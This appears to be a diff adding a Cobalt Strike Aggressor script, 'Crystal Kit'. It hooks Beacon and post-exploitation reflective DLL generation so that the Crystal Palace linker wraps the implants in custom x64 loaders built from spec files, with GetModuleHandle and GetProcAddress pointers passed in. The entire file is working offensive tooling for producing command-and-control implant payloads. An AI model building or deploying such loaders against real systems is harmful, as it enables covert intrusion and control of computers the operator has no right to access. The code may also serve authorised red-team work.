@@ -1,0 +1,114 @@
+debug ( 7 );
+
+import crystalpalace.spec.* from: crystalpalace.jar;
+import java.util.HashMap;
+
+sub print_info {
+   println ( formatDate ( "[HH:mm:ss] " ) . "\cE[Crystal Kit]\o " . $1 );
+}
+
+set BEACON_RDLL_GENERATE
+{
+    local ( '$beacon $arch $spec_path $spec $cap $final' );
+
+    $beacon = $2;
+    $arch   = $3;
+
+    if ( $arch eq "x86" )
+    {
+        warn ( "Crystal Kit is x64 only" );
+        return $null;
+    }
+
+    print_info ( "BEACON_RDLL_GENERATE" );
+
+    $spec_path = getFileProper ( script_resource ( "loader" ), "loader.spec" );
+    $spec      = [ LinkSpec Parse: $spec_path ];
+    $cap       = [ Capability Parse: cast ( $beacon, 'b' ) ];
+    $final     = [ $spec run: $cap, [ new HashMap ] ];
+
+    if ( strlen ( $final ) == 0 )
+    {
+        warn ( "Failed to build payload" );
+        return $null;
+    }
+
+    return $final;
+}
+
+set BEACON_RDLL_SIZE {
+   return "0";
+}
+
+set BEACON_RDLL_GENERATE_LOCAL
+{
+    local ( '$beacon $arch $gmh $gpa $spec_path $spec $cap $hash_map $final' );
+
+    $beacon = $2;
+    $arch   = $3;
+    $gmh    = $5;
+    $gpa    = $6;
+
+    if ( $arch eq "x86" )
+    {
+        warn ( "Crystal Kit is x64 only" );
+        return $null;
+    }
+
+    print_info ( "BEACON_RDLL_GENERATE_LOCAL" );
+
+    $spec_path = getFileProper ( script_resource ( "loader" ), "local-loader.spec" );
+    $spec      = [ LinkSpec Parse: $spec_path ];
+    $cap       = [ Capability Parse: cast ( $beacon, 'b' ) ];
+
+    $hash_map  = [ new HashMap ];
+
+    [ $hash_map put: "\$GMH", cast ( $gmh, 'b' ) ];
+    [ $hash_map put: "\$GPA", cast ( $gpa, 'b' ) ];
+
+    $final = [ $spec run: $cap, $hash_map ];
+
+    if ( strlen ( $final ) == 0 )
+    {
+        warn ( "Failed to build payload" );
+        return $null;
+    }
+
+    return $final;
+}
+
+set POSTEX_RDLL_GENERATE
+{ 
+    local ( '$postex $arch $gmh $gpa $spec_path $spec $hash_map $final' );
+   
+    $postex = $2;
+    $arch   = $3;
+    $gmh    = $5;
+    $gpa    = $6;
+
+    if ( $arch eq "x86" )
+    {
+        warn ( "Crystal Kit is x64 only" );
+        return $null;
+    }
+
+    print_info ( "POSTEX_RDLL_GENERATE" );
+
+    $spec_path = getFileProper ( script_resource ( "postex-loader" ), "loader.spec" );
+    $spec      = [ LinkSpec Parse: $spec_path ];
+
+    $hash_map  = [ new HashMap ];
+
+    [ $hash_map put: "\$GMH", cast ( $gmh, 'b' ) ];
+    [ $hash_map put: "\$GPA", cast ( $gpa, 'b' ) ];
+
+    $final = [ $spec run: $postex, $hash_map ];
+
+    if ( strlen ( $final ) == 0 )
+    {
+       warn ( "Failed to build package" );
+       return $null;
+    }
+
+    return $final;
+}
